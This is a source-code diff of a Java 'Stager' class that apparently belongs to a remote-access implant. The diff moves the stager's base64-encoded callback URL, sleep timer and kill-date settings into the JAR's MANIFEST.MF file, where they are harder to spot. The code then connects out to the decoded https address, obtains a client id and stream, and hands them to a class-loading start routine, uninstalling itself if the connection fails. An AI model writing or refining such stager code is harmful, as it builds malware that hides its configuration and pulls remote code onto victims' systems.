@@ -63,7 +63,6 @@ import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Date;
 import java.util.List;
-import java.util.Properties;
 
 /**
  *
@@ -74,8 +73,7 @@ public class Stager extends ClassLoader {
     public static String serviceName = ""; 
     public static final SimpleDateFormat CHECKIN_DATE_FORMAT = new SimpleDateFormat("MM/dd/yyyy--HH:mm");
     public static final String DEATH_LABEL ="X";
-    public static final String STAG_PROP_FILE ="stg";
-
+    public static final String STAG_PROP_FILE ="META-INF/MANIFEST.MF";
     
     /**
      * @param args the command line arguments
@@ -83,89 +81,91 @@ public class Stager extends ClassLoader {
      */
     public static void main(String[] args) throws Exception {
         
-        if( args.length > 0 ){
-            serviceName = args[0];
-        }
+        //Assign the service name
+        if( args.length > 0 )
+            serviceName = args[0];        
         
-        Properties localProperties = new Properties();
+        ManifestProperties localProperties = new ManifestProperties();
         Class localClass = Stager.class;
         
         InputStream localInputStream = localClass.getResourceAsStream("/" + STAG_PROP_FILE);
         if (localInputStream != null) {
+            
+            //Load the properties
             localProperties.load(localInputStream);
             localInputStream.close();
-        }    
 
-        InputStream theIS = null;
-        OutputStream theOS = null;
-        String decodedURL = null;
-        
-        byte[] clientId = null;
-        String theURL = localProperties.getProperty("U", null);
-        if (theURL != null){
+            InputStream theIS = null;
+            OutputStream theOS = null;
+            String decodedURL = null;
 
-            sun.misc.BASE64Decoder aDecoder = new sun.misc.BASE64Decoder();
-            decodedURL = new String( aDecoder.decodeBuffer(theURL) ).trim();
-            if ( decodedURL.startsWith("https:")) {
-                
-                //Create sleep timer
-                SleepTimer aTimer = new SleepTimer(decodedURL);
-                
-                //Get sleep time if it exists
-                String sleepTime = localProperties.getProperty("Z", null);
-                if (sleepTime != null){
-                    
-                    //Start the timer
-                    Long aLong = Long.parseLong(sleepTime );
-                    Date tmpDate = new Date( aLong ); 
-                    
-                    aTimer.addReconnectTime(tmpDate);
-                }
-                
-                //Get sleep time if it exists
-                String deathDateStr = localProperties.getProperty(DEATH_LABEL, null);
-                if (deathDateStr != null && !deathDateStr.isEmpty()){
-                    
-                    //Start the timer
-                    try {
-                        Long aLong = Long.parseLong(deathDateStr );
+            byte[] clientId = null;
+            String theURL = localProperties.getProperty("U", null);
+            if (theURL != null){
+
+                sun.misc.BASE64Decoder aDecoder = new sun.misc.BASE64Decoder();
+                decodedURL = new String( aDecoder.decodeBuffer(theURL) ).trim();
+                if ( decodedURL.startsWith("https:")) {
+
+                    //Create sleep timer
+                    SleepTimer aTimer = new SleepTimer(decodedURL);
+
+                    //Get sleep time if it exists
+                    String sleepTime = localProperties.getProperty("Z", null);
+                    if (sleepTime != null){
+
+                        //Start the timer
+                        Long aLong = Long.parseLong(sleepTime );
                         Date tmpDate = new Date( aLong ); 
 
-                        aTimer.setDeathDate(tmpDate);
-                    } catch ( NumberFormatException ex ){
-                        ex = null;
+                        aTimer.addReconnectTime(tmpDate);
                     }
-                }
-                
-                
-                //Start timer
-                aTimer.run();
-                
-                //Get the connection
-                URLConnection theConnection = aTimer.getUrlConnection();   
-                if( theConnection != null ){
-                    
-                    //Get the input stream
-                    theIS = aTimer.getInputStream();
-                    clientId = aTimer.getClientId();
-                    
+
+                    //Get sleep time if it exists
+                    String deathDateStr = localProperties.getProperty(DEATH_LABEL, null);
+                    if (deathDateStr != null && !deathDateStr.isEmpty()){
+
+                        //Start the timer
+                        try {
+                            Long aLong = Long.parseLong(deathDateStr );
+                            Date tmpDate = new Date( aLong ); 
+
+                            aTimer.setDeathDate(tmpDate);
+                        } catch ( NumberFormatException ex ){
+                            ex = null;
+                        }
+                    }
+
+
+                    //Start timer
+                    aTimer.run();
+
+                    //Get the connection
+                    URLConnection theConnection = aTimer.getUrlConnection();   
+                    if( theConnection != null ){
+
+                        //Get the input stream
+                        theIS = aTimer.getInputStream();
+                        clientId = aTimer.getClientId();
+
+                    } else {
+                        uninstall();
+                        return;
+                    }
+
                 } else {
-                    uninstall();
                     return;
                 }
-                
+
+                theOS = new ByteArrayOutputStream();
+
             } else {
                 return;
             }
-            
-            theOS = new ByteArrayOutputStream();
 
-        } else {
-            return;
+            Stager theStager = new Stager();
+            theStager.start(theIS, theOS, decodedURL, clientId );
         }
-    
-        Stager theStager = new Stager();
-        theStager.start(theIS, theOS, decodedURL, clientId );
 
     }
 
